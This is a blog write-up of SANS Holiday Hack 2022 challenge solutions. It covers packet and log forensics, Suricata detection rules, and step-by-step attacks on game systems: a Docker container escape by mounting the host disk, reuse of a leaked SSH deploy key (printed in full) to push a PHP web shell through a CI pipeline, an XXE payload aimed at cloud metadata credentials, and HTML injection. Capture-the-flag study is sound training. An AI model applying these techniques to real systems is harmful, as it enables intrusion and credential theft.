---
title: "Some SANS Holiday Hack 2022 Solutions"
date: 2023-01-19T12:29:17-08:00
draft: false
toc: true
comments: true
url: "/blog/sans-holiday-hack-2022/"
categories:
- Writeup
- Holiday Hack
---

As is tradition, I started the SANS Holiday Hack and stopped midway. A very fun
static analysis problem came along ;)

Previous years' writeups:
[/categories/holiday-hack/]({{< relref "/categories/holiday-hack/" >}}).

<!--more-->

# Recover the Tolkien Ring

## Wireshark Practice

1. What kind of objects can be exported from this PCAP?
    1. `HTTP`, we can already see the packets.
2. What is the file name of the largest file we can export?
    1. `app.php` is the largest with 808Kb.
    2. `File > Export Objects > HTTP`.
3. What packet number starts that app.php file?
    1. Same place, `687`.
4. What is the IP of the Apache server? 
    1. `192.185.57.242`.
    2. We find the `app.php` file, and see `Server: Apache` in the response
       headers.
5. What file is saved to the infected host?
    1. `Ref_Sept24-2020.zip`
    2. Export `app.php` and look inside. In the last lines after some base64
       encoded data we can see `saveAs(blob1, 'Ref_Sept24-2020.zip');`.
6. Attackers used bad TLS certificates in this traffic. Which countries were
   they registered to? Submit the names of the countries in alphabetical order
   separated by a commas (Ex: Norway, South Korea).
    1. `Israel, South Sudan, United States`, country codes `IL, SS, US`.
    2. Use the `ssl.handshake.type == 11` filter to only show certificates.
       We're only looking for certificates for attackers but I cannot find any
       certificates for the server IP address from before (`192.185.57.242`).
       Seems like all certificates must be mentioned.
7. Is the host infected (Yes/No)?
    1. `Yes`.

## Windows Event Logs

1. What month/day/year did the attack take place? For example, 09/05/2021.
    1. `12/24/2022`
    2. `grep -i "Get-ChildItem" powershell.evtx.log`
    3. There are a lot of access denied messages for this command. Seems like
       the attacker was searching for the file everywhere.
2. An attacker got a secret from a file. What was the original file's name?
    1. `recipe_updated.txt`
    2. `grep -i "Get-Content" powershell.evtx.log`
    3. The attacker probably used `Get-Content` to read the file. Looking in the
       file names, we can see the above.
3. The contents of the previous file were retrieved, changed, and stored to a
   variable by the attacker. This was done multiple times. Submit the last full
   PowerShell line that performed only these actions.
    1. `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'`
    2. From the previous grep's results.
4. After storing the altered file contents into the variable, the attacker used
   the variable to run a separate command that wrote the modified data to a
   file. This was done multiple times. Submit the last full PowerShell line that
   performed only this action.
    1. `$foo | Add-Content -Path 'Recipe'`
    2. `grep -i "\$foo" ...` has the answer.
        1. Logs are in reverse so the answer is the first result.
    3. `grep -i "out-file" ...` didn't return any valid results. None were from 24/12/2022.
5. The attacker ran the previous command against a file multiple times. What is
   the name of this file?
    1. `$foo | Add-Content -Path 'Recipe.txt'`
    2. `grep -i "\$foo \| Add-Content" ...`
    3. We see multiple instances of `$foo | Add-Content -Path 'Recipe.txt'`
6. Were any files deleted? (Yes/No)
    1. `Yes`
    2. `grep -i "Remove-Item" ...` has multiple results.
7. Was the original file (from question 2) deleted? (Yes/No)
    1. Answer is supposedly `No` but `recipe_updated.txt` was deleted.
    2. `grep -i "recipe_updated.txt" ...` returns 
8. What is the Event ID of the log that shows the actual command line used to
   delete the file?
    1. `4104`
    2. Search for `del ` in Event log using the Windows Event Log Viewer.
9. Is the secret ingredient compromised (Yes/No)?
    1. `Yes`
10. What is the secret ingredient?
    1. `honey`
    2. We can see it in the commands we saw above, it was replaced with `fish oil`.


## Suricata Regatta

### Suricata Rule 1

1. Catch DNS lookups for `adv.epostoday.uk`.
2. The alert message (msg) should read `Known bad DNS lookup, possible Dridex infection`.

We can just modify one of the rules already in the file.

```
alert dns $HOME_NET any -> any any
    (msg:"Known bad DNS lookup, possible Dridex infection";
    dns.query; content:"adv.epostoday.uk"; nocase; sid:11111;)
```

### Suricata Rule 2

1. Alert when the infected IP address `192.185.57.242` communicates with
   internal systems over HTTP. 
2. The message (msg) should read
   `Investigate suspicious connections, possible Dridex infection`.

```
alert http $HOME_NET any <> 192.185.57.242 any
    (msg:"Investigate suspicious connections, possible Dridex infection"; sid:22222;)
```

### Suricata Rule 3

1. TLS certificates with a specific `CN`.
2. Alert on an SSL certificate for `heardbellith.Icanwepeh.nagoya`.
3. The message (msg) should read `Investigate bad certificates, possible Dridex infection`.

```
alert tls any any -> $HOME_NET any
    (msg:"Investigate bad certificates, possible Dridex infection";
    tls.cert_subject; content:"CN=heardbellith.Icanwepeh.nagoya"; sid:33333;)
```

### Suricata Rule 4

1. One line from the JavaScript: `let byteCharacters = atob`.
2. Might be GZip compressed.
3. Alert on that HTTP data with message `Suspicious JavaScript function, possible Dridex infection`.

`http.response_body` automatically decompressed responses.

```
alert http any any -> $HOME_NET any
    (msg:"Suspicious JavaScript function, possible Dridex infectionn";
    http.response_body; content:"let byteCharacters = atob"; sid:44444;)
```

# Recover the Elfen Ring

## Clone with a Difference
Answer is `maintainers`.

`git clone https://haugfactory.com/asnowball/aws_scripts`

Also an interesting file: `~/.ssh/id_rsa`.

## Prison Escape
What hex string appears in the host file `/home/jailer/.ssh/jail.key.priv`?
`082bb339ec19de4935867`.

Hint from `Bow Ninecandle`

```
Developers love to give ALL TeH PERMz so that things "just work," but it can
cause real problems.

It's always smart to check for excessive user and container permissions.

You never know! You might be able to interact with host processes or
filesystems!
```

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation

```
$ grep Cap /proc/1/status
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

# had to use it on my own machine
$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,
cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,
cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,
cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,
cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,
cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,
cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,
cap_wake_alarm,cap_block_suspend,cap_audit_read
```

```
# become root
$ sudo -s

$ fdisk -l
fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/vda doesn't contain a valid partition table

# mount the host file system
$ mount /dev/vda /mnt

# read the secret file
$ cat /mnt/home/jailer/.ssh/jail.key.priv
# [removed]
# become admin
```

## Jolly CI/CD
Answer: `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`.

Hint from Tinsel

```
Great! Thanks so much for your help!

Now that you've helped me with this, I have time to tell you about the
deployment tech I've been working on!

Continuous Integration/Continuous Deployment pipelines allow developers to
iterate and innovate quickly.

With this project, once I push a commit, a GitLab runner will automatically
deploy the changes to production.

WHOOPS! I didn’t mean to commit that to
http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git

Unfortunately, if attackers can get in that pipeline, they can make an awful
mess of things!
```

Clone it

```bash
$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git

# make a copy of the original
$ cp -r wordpress.flag.net.internal/ original
```

```yaml
# $ cat .gitlab-ci.yml 
stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy"\
        --chown=www-data:www-data -atv --delete --progress ./\
        root@wordpress.flag.net.internal:/var/www/html
```

Seems like Tinsel messed up and committed a secret to the repo.

```bash
# See log messages
$ git log -10
commit 37b5d575bf81878934adb937a4fff0d32a8da105
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 13:58:15 2022 -0700

    updated wp-config

commit a59cfe83522c9aeff80d49a0be2226f4799ed239
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 12:41:05 2022 -0700

    update gitlab.ci.yml

commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 16:43:48 2022 -0700

    test

commit 7093aad279fc4b57f13884cf162f7d80f744eea5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 15:08:14 2022 -0700

    add gitlab-ci

commit e2208e4bae4d41d939ef21885f13ea8286b24f05
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:43:53 2022 -0700

    big update

commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets

commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
Author: knee-oh <sporx@kringlecon.com>
Date:   Mon Oct 24 17:32:07 2022 -0700

    init commit
```

Make a branch from that commit.

```bash
$ git checkout -b assets abdea0ebb21b156c01f7533cea3b895c26198c98
Switched to a new branch 'assets'
grinchum-land:~/wordpress.flag.net.internal$ git status
On branch assets
nothing to commit, working tree clean
grinchum-land:~/wordpress.flag.net.internal$ ll
total 48
drwxr-xr-x 8 samways users  4096 Dec 14 21:59 .git
drwxr-xr-x 5 samways users  4096 Dec 14 21:59 .
drwxr-xr-x 2 samways users  4096 Dec 14 21:59 .ssh
drwxr-xr-x 1 samways  1002  4096 Dec 14 21:58 ..
drwxr-xr-x 6 samways users  4096 Dec 14 21:56 wp-content
-rw-r--r-- 1 samways users 19915 Dec 14 21:56 license.txt
-rw-r--r-- 1 samways users  7401 Dec 14 21:56 readme.html

grinchum-land:~/wordpress.flag.net.internal/$ ll .ssh/
total 16
drwxr-xr-x 2 samways users 4096 Dec 14 21:59 .
drwxr-xr-x 5 samways users 4096 Dec 14 21:59 ..
-rw-r--r-- 1 samways users  411 Dec 14 21:59 .deploy
-rw-r--r-- 1 samways users  102 Dec 14 21:59 .deploy.pub
grinchum-land:~/wordpress.flag.net.internal/.ssh$ cat .deploy
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```

We can use this SSH key to push to the repo.

```bash
# copy the ssh key
$ cp wordpress.flag.net.internal/.ssh/.deploy ~/.ssh/
# change the permissions so ssh-agent doesn't complain
$ chmod 600 ~/.ssh/.deploy

# start the ssh-agent in the background
$ eval "$(ssh-agent -s)"
# add the private key
$ ssh-add ~/.ssh/.deploy
```

Now, we can try modifying the website and pushing stuff.

```bash
# set the git user.email and user.name
$ git config --global user.email "sporx@kringlecon.com"
$ git config --global user.name "sporx"
```

Change the remote URL to SSH

```
$ git checkout main
$ git remote set-url origin git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
# alternatively we could just clone the SSH URL and work There
$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
```

Do a test

```
$ nano nem.txt
$ git add .
$ git commit -m "test"
$ git push origin main
```

But where's the site?

In `wp-config.php` we see:

```
if(getenv_docker('WORDPRESS_ENV', false)) {
        $url = "http://wordpress.flag.net.internal:8080";
} else {
        $url = "http://wordpress.flag.net.internal";
}


define( 'WP_HOME', $url);
define( 'WP_SITEURL', $url);
```

I pushed `nem.txt` and now I can see it with `curl
http://wordpress.flag.net.internal/nem.txt`.

No need for a remote shell. Normal PHP web shell does the job. I used:
https://github.com/bayufedra/Tiny-PHP-Webshell

```
$ nano shell.php
# paste the code `<?=`$_GET[0]`?>`
$ git add .
$ git commit -m "sholl"
# might have to use -v here to accept the server fingerprint if this is your first interaction via SSH
$ git push origin main
```

The shell works:

```
$ curl http://wordpress.flag.net.internal/shell.php?0=ls
index.php
license.txt
readme.html
shell.php
wp-activate.php
# removed

$ curl http://wordpress.flag.net.internal/shell.php?0=ls%20../../../
bin
boot
dev
etc
flag.txt
# removed
```

What are we supposed to do here again?

```
$ curl http://wordpress.flag.net.internal/shell.php?0=cat%20../../../flag.txt
`oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`
```

# Recover the Web Ring

## Naughty IP

1. Wireshark `statistics > conversations`.
2. Sort by `Bytes`.
3. Most talkative is `18.222.86.32`

## Credential Mining
The first attack is a brute force login. What's the first username tried?

In Wireshark

1. `Edit > Find Packet`.
2. Change the combo box with `Display Filter` to `String`.
3. Search for `POST /login.html`.

First result is `alice`:

```
username=alice&password=philip
```

## 404 FTW
The next attack is forced browsing where the naughty one is guessing URLs.
What's the first successful URL path in this attack?

Answer: `/proc`.

Look at the logs. We can do this in VS Code with regex search then
`ctrl+shift+l` to select all the results and copy them somewhere else for
further analysis.

1. Only look at requests from `18.222.86.32`. `^18.222.86.32.*` (the dots will
   replace any character here but we're dealing with IP addresses here so it
   doesn't matter and we don't have to escape them with `\.`).
2. We know forced browsing is with `GET` so we search with this regex in the
   logs `GET .* 200 -` and we find a few in the beginning which we don't care
   about.
3. The first one in the middle is
   `18.222.86.32 - - [05/Oct/2022 16:47:46] "GET /proc HTTP/1.1" 200 -`

## IMDS, XXE, and Other Abbreviations
The last step in this attack was to use XXE to get secret keys from the IMDS
service. What URL did the attacker force the server to fetch?

In the logs search for `accesskey` to see the URL. The URL is on two lines so
don't just copy/paste the first part.

```
18.191.6.79 - - [05/Oct/2022 16:48:57] "GET / HTTP/1.1" 200 -
ic| xml: (b'<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [ <!ENTITY id SYSTE'
          b'M "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security'
          b'-credentials/ec2-instance"> ]>
// removed
```
Answer:
`http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`

## Open Boria Mine Door
Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get
some hints for this challenge.

Hint from the badge:

```
Lock Mechanism
From: Alabaster Snowball
Terminal: Boria Mine Door

The locks take input, render some type of image, and process on the back end to
unlock. To start, take a good look at the source HTML/JavaScript.
```

Open DevTools to see the request/responses. Enter any input in the first one.

### Pin1
POST request to `https://hhc22-novel.kringlecon.com/pin1`. Response has a
comment. `@&@&&W&&W&&&&`. That unlocks pin1.

```html
<!DOCTYPE html>
<html lang="en">
<head>
   <!-- removed -->
</head>
<body>
    <form method='post' action='pin1'>
        <!-- @&@&&W&&W&&&& -->
        <input class='inputTxt' name='inputTxt' type='text' value='' autocomplete='off' />
        <button>GO</button>
    </form>
    <div class='output'></div>
    <img class='captured'/>
    
    <script src='js/3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d.js'></script>
    <script src='pin.js'></script>
</body>
</html>
```

Anything to connect these two. I think these are rendered somewhat. Either it's
inside HTML or if it's rendered in an svg?!

`&&&&&&&&&&&&&` also works.

### Pin2

https://hhc22-novel.kringlecon.com/pin2 response is:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self';script-src 'self';style-src 'self' 'unsafe-inline'">
    <title>Lock 2</title>
    <link rel="stylesheet" href="pin.css">
</head>
<body>
    <form method='post' action='pin2'>
        <!-- TODO: FILTER OUT HTML FROM USER INPUT -->
        <input class='inputTxt' name='inputTxt' type='text' value='' autocomplete='off' />
        <button>GO</button>
    </form>
    <div class='output'></div>
    <img class='captured'/>
    
    <script src='js/ba8074100d1fe69c3f7e7bfee1f3468815472cf0.js'></script>
    <script src='pin.js'></script>
</body>
</html>
```

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src

Content-Security-Policy: style-src 'unsafe-inline';

This works because we need to connect `0,74` to `200,153`.
The image is `200 width by 170 height`.

```xml
<svg xmlns="http://www.w3.org/2000/svg" style="border:1px solid #ddd;" width="200" height="170" >
    <path d="M0 74L200 153" stroke="white" stroke-width="10"></path>
</svg>
```

### Pin3

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'; style-src 'self'">
    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"> -->
    <title>Lock 3</title>
    <link rel="stylesheet" href="pin.css">
</head>
<body>
    <form method='post' action='pin3'>
        <!-- TODO: FILTER OUT JAVASCRIPT FROM USER INPUT -->
        <input class='inputTxt' name='inputTxt' type='text' value='' autocomplete='off' />
        <button>GO</button>
    </form>
    <div class='output'></div>
    <img class='captured'/>
    
    <!-- js -->
    <script src='pin.js'></script>
</body>
</html>
```

Color is blue: RGB(0,0,255). 0,95 -> 200,21.

```xml
<svg xmlns="http://www.w3.org/2000/svg" style="border:1px solid #ddd;" width="200" height="170" >
    <path d="M0 95L200 21" stroke="blue" stroke-width="10"></path>
</svg>
```

### Pin4
Has some filtering:

```xml
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lock 4</title>
    <link rel="stylesheet" href="pin.css">
    <script>
        const sanitizeInput = () => {
            const input = document.querySelector('.inputTxt');
            const content = input.value;
            input.value = content
                .replace(/"/, '')
                .replace(/'/, '')
                .replace(/</, '')
                .replace(/>/, '');
        }
    </script>
</head>
<body>
    <form method='post' action='pin4'>
        <input class='inputTxt' name='inputTxt' type='text' value='' autocomplete='off' onblur='sanitizeInput()' />
        <button>GO</button>
    </form>
    <div class='output'></div>
    <img class='captured'/>
    
    <!-- js -->
    <script src='pin.js'></script>
</body>
</html>
```

I will come back later, I guess.

Hint after completion:

```
Great! Thanks so much for your help!

When you get to the fountain inside, there are some things you should consider.

First, it might be helpful to focus on Glamtariel's CAPITALIZED words.

If you finish those locks, I might just have another hint for you!
```
